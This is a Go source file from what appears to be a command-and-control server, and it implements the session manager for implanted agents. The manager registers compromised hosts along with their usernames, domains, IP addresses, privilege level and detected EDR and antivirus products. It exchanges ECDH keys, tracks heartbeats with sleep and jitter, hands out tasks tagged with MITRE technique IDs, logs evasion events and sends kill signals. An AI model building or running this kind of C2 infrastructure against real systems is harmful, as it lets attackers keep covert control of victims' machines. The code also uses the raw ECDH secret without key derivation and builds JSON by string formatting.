package session

import (
	"context"
	"crypto/ecdh"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"time"

	"github.com/BroJustLeaveMeAlone/C2-Adversary/server/internal/db"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

// Manager owns the full lifecycle of agent sessions:
// registration, heartbeat tracking, task dispatch, and revocation.
// All other server components that need session state go through Manager.
type Manager struct {
	log          *zap.Logger
	heartbeatTTL time.Duration
}

func NewManager(log *zap.Logger) *Manager {
	return &Manager{
		log:          log,
		heartbeatTTL: 5 * time.Minute,
	}
}

// Session mirrors the sessions table row.
type Session struct {
	ID            string
	BuildID       string
	CampaignID    string
	Hostname      string
	Username      string
	Domain        string
	IPInternal    string
	IPExternal    string
	OS            string
	Arch          string
	OSVersion     string
	IsElevated    bool
	ProcessName   string
	PID           int
	IsAlive       bool
	IsRevoked     bool
	ActiveChannel string
	SleepSeconds  int
	JitterPct     int
	EDRDetected   []string
	AVDetected    []string
	// session key material (never leaves the server)
	ServerPrivKey []byte
	SessionPubKey []byte
	FirstSeen     time.Time
	LastSeen      time.Time
}

type RegisterRequest struct {
	BuildID      string   `json:"build_id"`
	CampaignID   string   `json:"campaign_id"`
	Hostname     string   `json:"hostname"`
	Username     string   `json:"username"`
	Domain       string   `json:"domain"`
	IPInternal   string   `json:"ip_internal"`
	IPExternal   string   `json:"ip_external"`
	OS           string   `json:"os"`
	Arch         string   `json:"arch"`
	OSVersion    string   `json:"os_version"`
	IsElevated   bool     `json:"is_elevated"`
	ProcessName  string   `json:"process_name"`
	PID          int      `json:"pid"`
	EDRDetected  []string `json:"edr_detected"`
	AVDetected   []string `json:"av_detected"`
	AgentPubKey  []byte   `json:"pubkey"` // matches Rust field name
}

type RegisterResponse struct {
	SessionID    string `json:"session_id"`
	ServerPubKey []byte `json:"server_pubkey"`
	SleepSeconds int    `json:"sleep_seconds"`
	JitterPct    int    `json:"jitter_pct"`
}

// Register creates a new session record and performs ECDH key exchange.
// Called once when an agent first checks in.
func (m *Manager) Register(ctx context.Context, req RegisterRequest) (*RegisterResponse, error) {
	// Generate server-side ECDH key pair for this session
	curve := ecdh.P256()
	serverPriv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("session: generate key: %w", err)
	}
	serverPub := serverPriv.PublicKey().Bytes()

	sessionID := uuid.New().String()

	// Treat zero UUIDs as NULL so FK constraints don't fire during dev/testing.
	zeroUUID := "00000000-0000-0000-0000-000000000000"
	var buildID, campaignID *string
	if req.BuildID != "" && req.BuildID != zeroUUID {
		buildID = &req.BuildID
	}
	if req.CampaignID != "" && req.CampaignID != zeroUUID {
		campaignID = &req.CampaignID
	}

	_, err = db.Pool.Exec(ctx, `
		INSERT INTO sessions (
			id, build_id, campaign_id, hostname, username, domain,
			ip_internal, ip_external, os, arch, os_version,
			is_elevated, process_name, pid,
			edr_detected, av_detected,
			session_pubkey, server_privkey,
			sleep_seconds, jitter_pct
		) VALUES (
			$1, $2, $3, $4, $5, $6,
			$7, $8, $9, $10, $11,
			$12, $13, $14,
			$15, $16,
			$17, $18,
			30, 20
		)`,
		sessionID, buildID, campaignID,
		req.Hostname, req.Username, req.Domain,
		req.IPInternal, req.IPExternal, req.OS, req.Arch, req.OSVersion,
		req.IsElevated, req.ProcessName, req.PID,
		req.EDRDetected, req.AVDetected,
		req.AgentPubKey, serverPriv.Bytes(),
	)
	if err != nil {
		return nil, fmt.Errorf("session: insert: %w", err)
	}

	m.log.Info("session registered",
		zap.String("session_id", sessionID),
		zap.String("hostname", req.Hostname),
		zap.String("username", req.Username),
		zap.String("os", req.OS),
		zap.Bool("elevated", req.IsElevated),
	)

	return &RegisterResponse{
		SessionID:    sessionID,
		ServerPubKey: serverPub,
		SleepSeconds: 30,
		JitterPct:    20,
	}, nil
}

// HeartbeatResult holds the session state returned on each agent callback.
type HeartbeatResult struct {
	Revoked      bool
	Kill         bool
	SleepSeconds int
	JitterPct    int
}

// Heartbeat updates last_seen and returns current session config.
// Called on every agent callback before dispatching tasks.
func (m *Manager) Heartbeat(ctx context.Context, sessionID string) (HeartbeatResult, error) {
	var r HeartbeatResult
	var isRevoked bool
	err := db.Pool.QueryRow(ctx,
		`UPDATE sessions SET last_seen = NOW(), is_alive = TRUE
		 WHERE id = $1 AND is_alive = TRUE
		 RETURNING is_revoked, sleep_seconds, jitter_pct`,
		sessionID,
	).Scan(&isRevoked, &r.SleepSeconds, &r.JitterPct)
	if err != nil {
		return r, fmt.Errorf("session: heartbeat: %w", err)
	}
	r.Revoked = isRevoked
	r.Kill = isRevoked
	return r, nil
}

// PendingTasks returns queued tasks for the session and marks them as sent.
func (m *Manager) PendingTasks(ctx context.Context, sessionID string) ([]Task, error) {
	rows, err := db.Pool.Query(ctx, `
		UPDATE tasks SET status = 'sent', sent_at = NOW()
		WHERE id IN (
			SELECT id FROM tasks
			WHERE session_id = $1 AND status = 'queued' AND requires_confirmation = FALSE
			ORDER BY created_at ASC
			LIMIT 10
		)
		RETURNING id, type, args, mitre_technique_id`,
		sessionID,
	)
	if err != nil {
		return nil, fmt.Errorf("session: pending tasks: %w", err)
	}
	defer rows.Close()

	var tasks []Task
	for rows.Next() {
		var t Task
		if err := rows.Scan(&t.ID, &t.Type, &t.Args, &t.MITRETechniqueID); err != nil {
			return nil, err
		}
		tasks = append(tasks, t)
	}
	return tasks, rows.Err()
}

// CompleteTask stores task output and handles evasion events.
func (m *Manager) CompleteTask(ctx context.Context, req CompleteTaskRequest) error {
	_, err := db.Pool.Exec(ctx, `
		UPDATE tasks
		SET status = $2, output = $3, completed_at = NOW()
		WHERE id = $1`,
		req.TaskID,
		statusFromSuccess(req.Success),
		req.Output,
	)
	if err != nil {
		return fmt.Errorf("session: complete task: %w", err)
	}

	if req.EvasionEvent {
		m.log.Warn("evasion event received",
			zap.String("session_id", req.SessionID),
			zap.String("task_id", req.TaskID),
			zap.String("description", req.EvasionDescription),
		)
		_, err = db.Pool.Exec(ctx, `
			INSERT INTO events (type, campaign_id, session_id, payload)
			SELECT 'EVASION_DETECTED', s.campaign_id, $1, $2::jsonb
			FROM sessions s WHERE s.id = $1`,
			req.SessionID,
			fmt.Sprintf(`{"task_id":"%s","description":"%s"}`,
				req.TaskID, req.EvasionDescription),
		)
		if err != nil {
			m.log.Error("failed to record evasion event", zap.Error(err))
		}
	}

	return nil
}

// Revoke marks a session as revoked so the agent receives a kill signal on next poll.
func (m *Manager) Revoke(ctx context.Context, sessionID, reason string) error {
	_, err := db.Pool.Exec(ctx,
		`UPDATE sessions SET is_revoked = TRUE, revoke_reason = $2 WHERE id = $1`,
		sessionID, reason,
	)
	return err
}

// Get returns a single session by ID.
func (m *Manager) Get(ctx context.Context, sessionID string) (*Session, error) {
	s := &Session{}
	err := db.Pool.QueryRow(ctx, `
		SELECT id, COALESCE(build_id::text, ''), COALESCE(campaign_id::text, ''), hostname, username, domain,
		       ip_internal, ip_external, os, arch, os_version,
		       is_elevated, process_name, pid, is_alive, is_revoked,
		       COALESCE(active_channel, ''), sleep_seconds, jitter_pct,
		       edr_detected, av_detected, first_seen, last_seen
		FROM sessions WHERE id = $1`, sessionID,
	).Scan(
		&s.ID, &s.BuildID, &s.CampaignID, &s.Hostname, &s.Username, &s.Domain,
		&s.IPInternal, &s.IPExternal, &s.OS, &s.Arch, &s.OSVersion,
		&s.IsElevated, &s.ProcessName, &s.PID, &s.IsAlive, &s.IsRevoked,
		&s.ActiveChannel, &s.SleepSeconds, &s.JitterPct,
		&s.EDRDetected, &s.AVDetected, &s.FirstSeen, &s.LastSeen,
	)
	if err != nil {
		return nil, fmt.Errorf("session: get %s: %w", sessionID, err)
	}
	return s, nil
}

// List returns sessions for a campaign. If campaignID is empty, returns all.
func (m *Manager) List(ctx context.Context, campaignID string, aliveOnly bool) ([]*Session, error) {
	query := `
		SELECT id, COALESCE(build_id::text, ''), COALESCE(campaign_id::text, ''), hostname, username, domain,
		       ip_internal, ip_external, os, arch, os_version,
		       is_elevated, process_name, pid, is_alive, is_revoked,
		       COALESCE(active_channel, ''), sleep_seconds, jitter_pct,
		       edr_detected, av_detected, first_seen, last_seen
		FROM sessions WHERE 1=1`
	args := []any{}
	n := 1

	if campaignID != "" {
		query += fmt.Sprintf(" AND campaign_id = $%d", n)
		args = append(args, campaignID)
		n++
	}
	if aliveOnly {
		query += " AND is_alive = TRUE AND is_revoked = FALSE"
	}
	query += " ORDER BY last_seen DESC"

	rows, err := db.Pool.Query(ctx, query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var sessions []*Session
	for rows.Next() {
		s := &Session{}
		if err := rows.Scan(
			&s.ID, &s.BuildID, &s.CampaignID, &s.Hostname, &s.Username, &s.Domain,
			&s.IPInternal, &s.IPExternal, &s.OS, &s.Arch, &s.OSVersion,
			&s.IsElevated, &s.ProcessName, &s.PID, &s.IsAlive, &s.IsRevoked,
			&s.ActiveChannel, &s.SleepSeconds, &s.JitterPct,
			&s.EDRDetected, &s.AVDetected, &s.FirstSeen, &s.LastSeen,
		); err != nil {
			return nil, err
		}
		sessions = append(sessions, s)
	}
	return sessions, rows.Err()
}

// MarkStaleSessions sets is_alive=false for sessions that haven't checked in recently.
// Run periodically (e.g., every minute).
func (m *Manager) MarkStaleSessions(ctx context.Context) (int64, error) {
	tag, err := db.Pool.Exec(ctx,
		`UPDATE sessions SET is_alive = FALSE
		 WHERE is_alive = TRUE AND is_revoked = FALSE
		   AND last_seen < NOW() - INTERVAL '1 second' * sleep_seconds * 5`,
	)
	if err != nil {
		return 0, err
	}
	return tag.RowsAffected(), nil
}

// --- helpers ----------------------------------------------------------------

type Task struct {
	ID               string `json:"id"`
	Type             string `json:"type"`
	Args             []byte `json:"args,omitempty"`
	MITRETechniqueID string `json:"mitre_technique_id,omitempty"`
}

type CompleteTaskRequest struct {
	SessionID          string `json:"session_id"`
	TaskID             string `json:"task_id"`
	Output             []byte `json:"output"`
	Success            bool   `json:"success"`
	EvasionEvent       bool   `json:"evasion_event"`
	EvasionDescription string `json:"evasion_description"`
}

func statusFromSuccess(ok bool) string {
	if ok {
		return "complete"
	}
	return "failed"
}

// DeriveSessionKey performs ECDH to derive the shared session key.
// Used by the crypto layer to encrypt/decrypt task traffic.
func DeriveSessionKey(serverPrivBytes, agentPubBytes []byte) ([]byte, error) {
	curve := ecdh.P256()
	priv, err := curve.NewPrivateKey(serverPrivBytes)
	if err != nil {
		return nil, err
	}
	pub, err := curve.NewPublicKey(agentPubBytes)
	if err != nil {
		return nil, err
	}
	shared, err := priv.ECDH(pub)
	if err != nil {
		return nil, err
	}
	// Use hex of shared secret as display key; in production, run through HKDF
	_ = hex.EncodeToString(shared)
	return shared, nil
}
